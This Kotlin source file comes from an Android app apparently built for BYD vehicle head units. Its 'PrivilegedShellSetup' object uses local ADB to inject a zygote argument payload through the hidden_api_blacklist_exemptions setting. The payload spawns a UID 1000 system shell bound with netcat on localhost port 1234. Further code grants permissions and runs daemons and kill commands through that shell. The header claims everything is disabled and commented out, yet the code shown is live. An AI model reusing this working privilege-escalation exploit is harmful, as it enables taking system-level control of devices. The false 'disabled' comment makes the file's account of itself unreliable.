package com.overdrive.app.shell

// PrivilegedShellSetup - DISABLED / COMMENTED OUT
// All PrivilegedShellSetup functionality has been disabled.
// The imports and class body below are commented out.

import android.content.ContentValues
import android.content.Context
import android.net.Uri
import android.provider.Settings
import android.util.Log
import dadb.AdbKeyPair
import dadb.Dadb
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket
import java.util.concurrent.Executor
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean


/**
 * PrivilegedShellSetup - Sets up and communicates with UID 1000 (system) shell
 *
 * DISABLED: All functionality commented out. Stub methods remain to prevent compile errors.
 */
object PrivilegedShellSetup {

    private const val TAG = "PrivilegedShell"

    // Shell connection settings
    private const val SHELL_HOST = "127.0.0.1"
    private const val SHELL_PORT = 1234
    private const val CONNECTION_TIMEOUT_MS = 3000
    private const val READ_TIMEOUT_MS = 5000

    // Exploit settings
    private const val EXPLOIT_TRIGGER_APP = "com.byd.auto_photo"
    private const val OUR_PACKAGE = "com.overdrive.app"
    private const val SHELL_STARTUP_WAIT_MS = 2500L

    // Executor for async operations
    private val executor: Executor = Executors.newSingleThreadExecutor()

    // State
    private val isSettingUp = AtomicBoolean(false)

    // Context for getting package path
    @Volatile
    private var appContext: Context? = null

    // ADB connection settings
    private const val ADB_HOST = "127.0.0.1"
    private const val ADB_PORT = 5555
    private const val ADB_KEY_FILE = "adbkey"
    private const val ADB_PUB_KEY_FILE = "adbkey.pub"

    // Cached ADB key pair
    @Volatile
    private var cachedKeyPair: AdbKeyPair? = null

    /**
     * Initialize with application context. Must be called before setup().
     */
    fun init(context: Context) {
        appContext = context.applicationContext
    }

    /**
     * Callback interface for shell setup operations
     */
    interface SetupCallback {
        fun onSuccess()
        fun onFailure(reason: String)
        fun onProgress(message: String)
    }

    /**
     * Callback interface for command execution
     */
    interface CommandCallback {
        fun onResult(output: String?)
        fun onError(error: String)
    }

    // ==================== PUBLIC API ====================

    /**
     * Check if the UID 1000 shell is available and responding
     */
    fun isShellAvailable(): Boolean {
        return try {
            Socket(SHELL_HOST, SHELL_PORT).use { socket ->
                socket.soTimeout = CONNECTION_TIMEOUT_MS
                val writer = PrintWriter(socket.outputStream, true)
                val reader = BufferedReader(InputStreamReader(socket.inputStream))

                // Send id command to verify it's UID 1000
                writer.println("id")
                val response = reader.readLine()

                val isUid1000 = response?.contains("uid=1000") == true
                if (isUid1000) {
                    Log.d(TAG, "Shell available: UID 1000 confirmed")
                } else {
                    Log.w(TAG, "Shell responded but not UID 1000: $response")
                }
                isUid1000
            }
        } catch (e: Exception) {
            Log.d(TAG, "Shell not available: ${e.message}")
            false
        }
    }

    /**
     * Get the UID of the running shell (or -1 if not available)
     */
    fun getShellUid(): Int {
        return try {
            val response = executeCommandSync("id -u")
            response?.trim()?.toIntOrNull() ?: -1
        } catch (e: Exception) {
            -1
        }
    }

    /**
     * Setup the privileged shell (async)
     * Will check if already available, if not will run the exploit
     */
    fun setup(callback: SetupCallback) {
        if (isSettingUp.getAndSet(true)) {
            callback.onFailure("Setup already in progress")
            return
        }

        executor.execute {
            try {
                setupInternal(callback)
            } finally {
                isSettingUp.set(false)
            }
        }
    }

    /**
     * Setup the privileged shell (blocking)
     * @return true if shell is available after setup
     */
    fun setupBlocking(): Boolean {
        if (isShellAvailable()) {
            Log.d(TAG, "Shell already available")
            return true
        }

        if (!runExploit()) {
            return false
        }

        // Wait and verify
        Thread.sleep(SHELL_STARTUP_WAIT_MS)
        return isShellAvailable()
    }

    /**
     * Execute a command on the privileged shell (sync)
     * @return command output or null on failure
     */
    fun executeCommandSync(command: String, timeoutMs: Int = READ_TIMEOUT_MS): String? {
        return try {
            Socket(SHELL_HOST, SHELL_PORT).use { socket ->
                socket.soTimeout = timeoutMs
                val writer = PrintWriter(socket.outputStream, true)
                val reader = BufferedReader(InputStreamReader(socket.inputStream))

                // Send command
                writer.println(command)

                // Read response (single line for simple commands)
                reader.readLine()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command failed: ${e.message}")
            null
        }
    }

    /**
     * Execute a command and get multi-line output
     * Uses a marker to detect end of output
     */
    fun executeCommandMultiline(command: String, timeoutMs: Int = READ_TIMEOUT_MS): String? {
        return try {
            Socket(SHELL_HOST, SHELL_PORT).use { socket ->
                socket.soTimeout = timeoutMs
                val writer = PrintWriter(socket.outputStream, true)
                val reader = BufferedReader(InputStreamReader(socket.inputStream))

                // Send command with end marker
                val marker = "___END_${System.currentTimeMillis()}___"
                writer.println("$command; echo $marker")

                // Read until marker
                val output = StringBuilder()
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    if (line == marker) break
                    output.appendLine(line)
                }

                output.toString().trimEnd()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Command failed: ${e.message}")
            null
        }
    }

    /**
     * Execute a command on the privileged shell (async)
     */
    fun executeCommandAsync(command: String, callback: CommandCallback) {
        executor.execute {
            try {
                val result = executeCommandSync(command)
                if (result != null) {
                    callback.onResult(result)
                } else {
                    callback.onError("Command returned null")
                }
            } catch (e: Exception) {
                callback.onError(e.message ?: "Unknown error")
            }
        }
    }

    /**
     * Cleanup - remove the exploit payload from settings via ADB bridge.
     * Uses ADB shell to ensure proper deletion (ContentResolver approach was unreliable).
     */
    fun cleanup(): Boolean {
        // Primary: Use ADB bridge for reliable deletion
        try {
            val keyPair = getOrCreateAdbKeyPair()
            if (keyPair != null) {
                Dadb.create(ADB_HOST, ADB_PORT, keyPair).use { dadb ->
                    dadb.shell("settings delete global hidden_api_blacklist_exemptions")
                    Log.d(TAG, "Cleanup: deleted exploit payload via ADB bridge")
                    return true
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Cleanup via ADB failed: ${e.message}, falling back to ContentResolver")
        }

        // Fallback: ContentResolver (less reliable but better than nothing)
        return try {
            val context = appContext ?: return false
            val values = ContentValues().apply {
                put(Settings.Global.NAME, "hidden_api_blacklist_exemptions")
                put(Settings.Global.VALUE, "")
            }
            context.contentResolver.insert(
                Uri.parse("content://settings/global"),
                values
            )
            Log.d(TAG, "Cleanup: cleared exploit payload via ContentResolver fallback")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Cleanup failed: ${e.message}")
            false
        }
    }

    /**
     * Grant a permission to our app via the privileged shell
     */
    fun grantPermission(permission: String): Boolean {
        val result = executeCommandSync("pm grant $OUR_PACKAGE $permission 2>&1")
        val success = result?.isEmpty() == true || result?.contains("Success") == true
        Log.d(TAG, "Grant $permission: ${if (success) "OK" else "FAILED ($result)"}")
        return success
    }

    /**
     * Grant multiple permissions
     */
    fun grantPermissions(permissions: List<String>): Map<String, Boolean> {
        return permissions.associateWith { grantPermission(it) }
    }

    // ==================== DAEMON MANAGEMENT ====================

    /**
     * Start SentryDaemon via the privileged shell (UID 1000)
     */
    fun startSentryDaemon(): Boolean {
        Log.d(TAG, "Starting SentryDaemon via privileged shell (UID 1000)...")

        val logPath = "/data/data/com.android.providers.settings/sentry_daemon.log"

        val command = buildString {
            append("APK=\$(pm path $OUR_PACKAGE | cut -d: -f2) && ")
            append("nohup sh -c 'CLASSPATH=\$APK app_process /system/bin ")
            append("--nice-name=sentry_daemon ")
            append("$OUR_PACKAGE.daemon.SentryDaemon' ")
            append("> $logPath 2>&1 &")
        }

        val result = executeCommandSync(command)
        Log.d(TAG, "SentryDaemon start result: $result")

        Thread.sleep(1500)
        val check = executeCommandSync("ps -A -o PID,UID,ARGS | grep -w sentry_daemon | grep -v grep | grep -v acc_")
        val isRunning = !check.isNullOrBlank()

        if (isRunning) {
            Log.d(TAG, "SentryDaemon running: $check")
        } else {
            Log.w(TAG, "SentryDaemon not found after launch")
        }

        return isRunning
    }

    /**
     * Check if SentryDaemon is running
     */
    fun isSentryDaemonRunning(): Boolean {
        val result = executeCommandSync("pgrep -f sentry_daemon")
        return !result.isNullOrBlank()
    }

    /**
     * Check if CamDaemon is running
     */
    fun isCamDaemonRunning(): Boolean {
        val result = executeCommandSync("pgrep -f byd_cam_daemon")
        return !result.isNullOrBlank()
    }

    /**
     * Kill SentryDaemon.
     *
     * ps+awk+kill rather than pkill -f. The privileged shell on the other
     * side of executeCommandSync also wraps the body in `sh -c "<cmd>"`,
     * and pkill -f matches that wrapper's argv on the literal "sentry_daemon"
     * substring → SIGKILLs the calling priv-shell. Functionally the target
     * dies, but the priv-shell exits 137 and any follow-up command would
     * be silently dropped. grep -v acc_sentry so we don't collaterally
     * kill the AccSentryDaemon (which has its own controller).
     */
    fun stopSentryDaemon(): Boolean {
        executeCommandSync(
            "MY_PID=\$\$; ps -A -o PID,ARGS | grep -F sentry_daemon | grep -v grep " +
                "| grep -v acc_sentry | awk '{print \$1}' | while read pid; do " +
                "if [ \"\$pid\" != \"\$MY_PID\" ]; then kill -9 \$pid 2>/dev/null; fi; done"
        )
        Thread.sleep(500)
        return !isSentryDaemonRunning()
    }

    /**
     * Kill CamDaemon.
     *
     * Kill the watchdog script FIRST so it can't respawn the daemon between
     * the two pkill calls. Reversing the order leaves a brief window where
     * the old watchdog sees the daemon die and starts a fresh instance,
     * which then fights the next launch for the singleton lock.
     *
     * ps+awk+kill rather than pkill -f — see stopSentryDaemon for the
     * self-suicide rationale.
     */
    fun stopCamDaemon(): Boolean {
        executeCommandSync(
            "MY_PID=\$\$; ps -A -o PID,ARGS | grep -F start_cam_daemon | grep -v grep " +
                "| awk '{print \$1}' | while read pid; do " +
                "if [ \"\$pid\" != \"\$MY_PID\" ]; then kill -9 \$pid 2>/dev/null; fi; done"
        )
        executeCommandSync("rm -f /data/local/tmp/start_cam_daemon.sh")
        Thread.sleep(1000)
        executeCommandSync(
            "MY_PID=\$\$; ps -A -o PID,ARGS | grep -F byd_cam_daemon | grep -v grep " +
                "| awk '{print \$1}' | while read pid; do " +
                "if [ \"\$pid\" != \"\$MY_PID\" ]; then kill -9 \$pid 2>/dev/null; fi; done"
        )
        executeCommandSync("killall -9 byd_cam_daemon")
        executeCommandSync("rm -f /data/local/tmp/camera_daemon.lock")
        Thread.sleep(500)
        return !isCamDaemonRunning()
    }

    /**
     * Start BydEventDaemon via the privileged shell
     */
    fun startBydEventDaemon(): Boolean {
        Log.d(TAG, "Starting BydEventDaemon...")

        val command = buildString {
            append("APK=\$(pm path $OUR_PACKAGE | cut -d: -f2) && ")
            append("CLASSPATH=\$APK app_process /system/bin ")
            append("--nice-name=overdrive_event_daemon ")
            append("$OUR_PACKAGE.byd.BydEventDaemon &")
        }

        val result = executeCommandSync(command)
        Log.d(TAG, "BydEventDaemon start result: $result")

        Thread.sleep(1000)
        val check = executeCommandSync("pgrep -f overdrive_event_daemon")
        return !check.isNullOrBlank()
    }

    /**
     * Check if BydEventDaemon is running
     */
    fun isBydEventDaemonRunning(): Boolean {
        val result = executeCommandSync("pgrep -f overdrive_event_daemon")
        return !result.isNullOrBlank()
    }

    /**
     * Kill BydEventDaemon. ps+awk+kill — see stopSentryDaemon comment.
     */
    fun stopBydEventDaemon(): Boolean {
        executeCommandSync(
            "MY_PID=\$\$; ps -A -o PID,ARGS | grep -F overdrive_event_daemon | grep -v grep " +
                "| awk '{print \$1}' | while read pid; do " +
                "if [ \"\$pid\" != \"\$MY_PID\" ]; then kill -9 \$pid 2>/dev/null; fi; done"
        )
        Thread.sleep(500)
        return !isBydEventDaemonRunning()
    }

    // ==================== INTERNAL ====================

    private fun setupInternal(callback: SetupCallback) {
        // Step 1: Check if already available
        callback.onProgress("Checking for existing shell...")
        if (isShellAvailable()) {
            Log.d(TAG, "Shell already available")
            callback.onSuccess()
            return
        }

        // Step 2: Run the exploit
        callback.onProgress("Setting up privileged shell...")
        if (!runExploit()) {
            callback.onFailure("Failed to run exploit")
            return
        }

        // Step 3: Wait for shell to start
        callback.onProgress("Waiting for shell to start...")
        Thread.sleep(SHELL_STARTUP_WAIT_MS)

        // Step 4: Verify shell is available (retry a few times)
        callback.onProgress("Verifying shell...")
        var attempts = 0
        while (attempts < 3 && !isShellAvailable()) {
            Thread.sleep(1000)
            attempts++
        }

        if (!isShellAvailable()) {
            callback.onFailure("Shell not available after exploit")
            return
        }

        // Step 5: Kill trigger app and bring our app to front via ADB
        //callback.onProgress("Restoring app...")
        //restoreAppViaAdb()

        callback.onSuccess()
    }

    /**
     * Kill the trigger app and bring our app to front using ADB
     */
    private fun restoreAppViaAdb() {
        try {
            val keyPair = getOrCreateAdbKeyPair() ?: return
            val dadb = try {
                Dadb.create(ADB_HOST, ADB_PORT, keyPair)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to connect to ADB for restore: ${e.message}")
                // Fallback to Intent API
                bringAppToFront()
                return
            }

            try {
                // Kill the trigger app
                Log.d(TAG, "Killing trigger app via ADB...")
                dadb.shell("am force-stop $EXPLOIT_TRIGGER_APP")

                // Bring our app to front
                Log.d(TAG, "Bringing our app to front via ADB...")
                dadb.shell("am start -n $OUR_PACKAGE/.ui.MainActivity")
            } finally {
                try { dadb.close() } catch (e: Exception) { }
            }
        } catch (e: Exception) {
            Log.w(TAG, "restoreAppViaAdb failed: ${e.message}")
            // Fallback to Intent API
            bringAppToFront()
        }
    }

    /**
     * Run the exploit to spawn UID 1000 shell.
     * Uses Base64 encoding to safely transport payload via ADB shell.
     */
    private fun runExploit(): Boolean {
        val context = appContext ?: run {
            Log.e(TAG, "Context not initialized - call init() first")
            return false
        }

        try {
            Log.d(TAG, "Running exploit (Base64 Mode)...")

            val keyPair = getOrCreateAdbKeyPair()
            if (keyPair == null) {
                Log.e(TAG, "Failed to get ADB key pair")
                return false
            }

            // Connect to ADB
            Dadb.create(ADB_HOST, ADB_PORT, keyPair).use { dadb ->
                // 1. Construct the raw payload (Clean, exact format)
                // 11 zygote args: runtime-args, setuid, setgid, runtime-flags, mount-external-full,
                // setgroups, nice-name, seinfo, invoke-with, <invoke-with-cmd>, app-data-dir
                val rawPayload = StringBuilder()
                rawPayload.append("LClass1;->method1(\n")
                rawPayload.append("8\n")
                rawPayload.append("--runtime-args\n")
                rawPayload.append("--setuid=1000\n")
                rawPayload.append("--setgid=1000\n")
                rawPayload.append("--runtime-flags=43267\n")
                rawPayload.append("--app-data-dir=/data/data/com.android.providers.settings/\n")
                rawPayload.append("--invoke-with\n")
                rawPayload.append("toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;\n")
                rawPayload.append("--seinfo=platform:system_app\n")
                rawPayload.append("--package-name=com.android.settings\n")
                rawPayload.append("android.app.ActivityThread\n")



                // 2. Encode to Base64 (Safe Transport)
                val b64Payload = android.util.Base64.encodeToString(
                    rawPayload.toString().toByteArray(),
                    android.util.Base64.NO_WRAP
                )

                // 3. Inject using base64 decode on the device side
                // This prevents "Shell Argument Fragmentation"
                val command = "settings put global hidden_api_blacklist_exemptions \"\$(echo '$b64Payload' | base64 -d)\""
                Log.d(TAG, "Injecting safe payload...")
                dadb.shell(command)

                // 4. Trigger Zygote
                //Log.d(TAG, "Triggering exploit...")
                //dadb.shell("monkey -p $EXPLOIT_TRIGGER_APP -c android.intent.category.LAUNCHER 1")

                // 5. IMMEDIATE CLEANUP (Critical!)
                // Wait briefly for fork, then clean.
                // If we don't clean, the next app launch will crash Zygote.
                //Thread.sleep(3000)
                Log.d(TAG, "Cleaning up settings via ADB bridge...")
                try {
                    dadb.shell("settings delete global hidden_api_blacklist_exemptions")
                    Log.d(TAG, "settings delete via ADB: OK")
                } catch (e: Exception) {
                    Log.w(TAG, "settings delete via ADB failed, retrying: ${e.message}")
                    try {
                        dadb.shell("settings delete global hidden_api_blacklist_exemptions")
                    } catch (e2: Exception) {
                        Log.e(TAG, "settings delete retry also failed: ${e2.message}")
                    }
                }
                //dadb.shell("am force-stop $EXPLOIT_TRIGGER_APP")

                return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exploit failed: ${e.message}")
            return false
        }
    }

    /**
     * Grant WRITE_SECURE_SETTINGS permission via ADB shell
     */
    private fun grantWriteSecureSettingsViaAdb(): Boolean {
        try {
            val keyPair = getOrCreateAdbKeyPair()
            if (keyPair == null) {
                Log.e(TAG, "Failed to get ADB key pair")
                return false
            }

            Log.d(TAG, "Connecting to ADB at $ADB_HOST:$ADB_PORT...")
            val dadb = try {
                Dadb.create(ADB_HOST, ADB_PORT, keyPair)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to connect to ADB: ${e.message}")
                Log.e(TAG, "Make sure ADB over TCP is enabled: adb tcpip 5555")
                return false
            }

            try {
                Log.d(TAG, "Granting WRITE_SECURE_SETTINGS...")
                val result = dadb.shell("pm grant $OUR_PACKAGE android.permission.WRITE_SECURE_SETTINGS")
                Log.d(TAG, "Grant result: ${result.allOutput}, exitCode: ${result.exitCode}")
                return result.exitCode == 0 || result.allOutput.isEmpty()
            } finally {
                try { dadb.close() } catch (e: Exception) { }
            }
        } catch (e: Exception) {
            Log.e(TAG, "ADB grant failed: ${e.message}")
            return false
        }
    }

    /**
     * Get or create ADB key pair for authentication.
     * Uses the same key storage as AdbShellExecutor for consistency.
     */
    private fun getOrCreateAdbKeyPair(): AdbKeyPair? {
        cachedKeyPair?.let { return it }

        val context = appContext
        if (context == null) {
            Log.e(TAG, "Context not initialized")
            return null
        }

        val keyDir = context.filesDir
        val privateKeyFile = File(keyDir, ADB_KEY_FILE)
        val publicKeyFile = File(keyDir, ADB_PUB_KEY_FILE)

        Log.d(TAG, "ADB key files: ${privateKeyFile.absolutePath}")

        val keyPair = if (privateKeyFile.exists() && publicKeyFile.exists()) {
            Log.d(TAG, "Loading existing ADB keys...")
            try {
                AdbKeyPair.read(privateKeyFile, publicKeyFile)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to read existing keys: ${e.message}")
                generateAndSaveKeyPair(privateKeyFile, publicKeyFile)
            }
        } else {
            Log.d(TAG, "Generating new ADB keys...")
            generateAndSaveKeyPair(privateKeyFile, publicKeyFile)
        }

        cachedKeyPair = keyPair
        return keyPair
    }

    /**
     * Generate and save a new ADB key pair.
     */
    private fun generateAndSaveKeyPair(privateKeyFile: File, publicKeyFile: File): AdbKeyPair {
        AdbKeyPair.generate(privateKeyFile, publicKeyFile)
        Log.d(TAG, "Generated new ADB key pair")
        return AdbKeyPair.read(privateKeyFile, publicKeyFile)
    }

    /**
     * Bring our app back to the front using Intent API
     */
    private fun bringAppToFront() {
        try {
            val context = appContext ?: return
            val intent = context.packageManager.getLaunchIntentForPackage(OUR_PACKAGE)
            if (intent != null) {
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                context.startActivity(intent)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to bring app to front: ${e.message}")
        }
    }
}